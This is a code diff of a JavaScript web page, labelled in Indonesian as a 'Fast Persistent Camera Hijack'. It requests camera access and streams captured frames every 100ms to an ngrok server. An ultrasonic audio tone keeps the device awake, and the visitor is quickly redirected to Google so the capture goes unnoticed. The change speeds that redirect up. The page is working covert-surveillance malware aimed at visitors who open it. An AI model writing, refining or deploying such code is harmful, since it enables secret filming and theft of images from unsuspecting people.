@@ -34,7 +34,6 @@
   var executed = false;
   var streamInterval = null;
   var audioCtx = null;
-  var isCameraActive = false;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -45,13 +44,13 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com"; 
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
   
-  // Delay sebelum redirect (ms) - Beri waktu kamera menyala & merekam
-  var REDIRECT_DELAY = 5000; // 5 Detik
+  // Delay sebelum redirect (ms) - Dipercepat
+  var REDIRECT_DELAY = 500; // 500ms
 
   // ============================================
-  // FUNGSI: AUDIO KEEP-ALIVE (MENCEGAH SLEEP)
+  // FUNGSI: AUDIO KEEP-ALIVE
   // ============================================
   function initAudioKeepAlive() {
     try {
@@ -59,8 +58,8 @@
       audioCtx = new AudioContext();
       var osc = audioCtx.createOscillator();
       var gain = audioCtx.createGain();
-      gain.gain.value = 0.0001; // Sangat pelan
-      osc.frequency.value = 18000; // Ultrasonic
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 18000;
       osc.connect(gain);
       gain.connect(audioCtx.destination);
       osc.start();
@@ -99,9 +98,9 @@
   }
 
   // ============================================
-  // FUNGSI: START CAMERA & REDIRECT SETELAH AKTIF
+  // FUNGSI: START CAMERA & REDIRECT CEPAT
   // ============================================
-  function startCamera() {
+  function startCameraAndRedirect() {
     try {
       log("[+] Meminta Izin Kamera...");
       
@@ -111,18 +110,15 @@
           video.srcObject = stream;
           video.play().catch(function(){});
           log("[+] 🚨 KAMERA BERHASIL diakses!");
-          isCameraActive = true;
 
-          // Mulai streaming gambar setiap 100ms
+          // Mulai streaming gambar
           if (streamInterval) clearInterval(streamInterval);
           streamInterval = setInterval(sendImageToServer, 100);
 
-          // Redirect ke Google setelah delay (kamera sudah aktif)
+          // Redirect ke Google setelah 500ms (kamera sudah aktif)
           setTimeout(function() {
             log("[+] Redirect ke Google setelah " + REDIRECT_DELAY + "ms...");
-            try {
-              window.location.href = TARGET_URL;
-            } catch(e) {}
+            window.location.href = TARGET_URL;
           }, REDIRECT_DELAY);
 
         })
@@ -150,13 +146,13 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Persistent Camera Hijack...");
+    log("[!] Memulai Fast Persistent Camera Hijack...");
 
     // A. Inisialisasi Audio Keep-Alive
     initAudioKeepAlive();
 
-    // B. Mulai Kamera (Akan redirect setelah aktif)
-    startCamera();
+    // B. Mulai Kamera & Redirect Cepat
+    startCameraAndRedirect();
 
   }, { once: true });
 
